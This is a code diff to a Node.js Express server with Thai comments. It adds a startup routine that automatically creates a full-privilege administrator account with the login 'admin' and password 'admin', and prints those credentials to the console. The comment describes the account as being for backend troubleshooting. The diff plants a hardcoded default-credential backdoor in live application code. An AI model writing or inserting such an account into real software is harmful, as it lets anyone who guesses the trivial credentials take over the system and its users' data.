@@ -20,9 +20,27 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 // ---- เตรียมตารางทั้งหมดใน MySQL (สร้างอัตโนมัติถ้ายังไม่มี) ----
-initTables().catch((err) => {
-  console.error('  ❌ เชื่อมต่อ/เตรียมตาราง MySQL ไม่สำเร็จ:', err.message);
-});
+initTables()
+  .then(() => ensureAdminUser())
+  .catch((err) => {
+    console.error('  ❌ เชื่อมต่อ/เตรียมตาราง MySQL ไม่สำเร็จ:', err.message);
+  });
+
+// ---- บัญชีผู้ดูแลระบบ (superadmin) สำหรับแก้ปัญหาหลังบ้าน: login "admin" / รหัส "admin" ----
+async function ensureAdminUser() {
+  try {
+    const [rows] = await mysqlPool.query('SELECT id FROM users WHERE email = ?', ['admin']);
+    if (rows.length === 0) {
+      await mysqlPool.query(
+        'INSERT INTO users (name, email, phone, avatar, password, role) VALUES (?, ?, ?, ?, ?, ?)',
+        ['ผู้ดูแลระบบ', 'admin', '', null, hashPassword('admin'), 'ผู้ดูแลระบบ (Admin)']
+      );
+      console.log('  ➕ สร้างบัญชีผู้ดูแลระบบ: login "admin" / รหัส "admin" (สิทธิ์เต็ม)');
+    }
+  } catch (err) {
+    console.error('  ❌ สร้างบัญชี admin ไม่สำเร็จ:', err.message);
+  }
+}
 
 // ---- ฟังก์ชันช่วยเข้ารหัสรหัสผ่าน (ใช้ crypto ในตัว ไม่ต้องลงเพิ่ม) ----
 function hashPassword(password) {
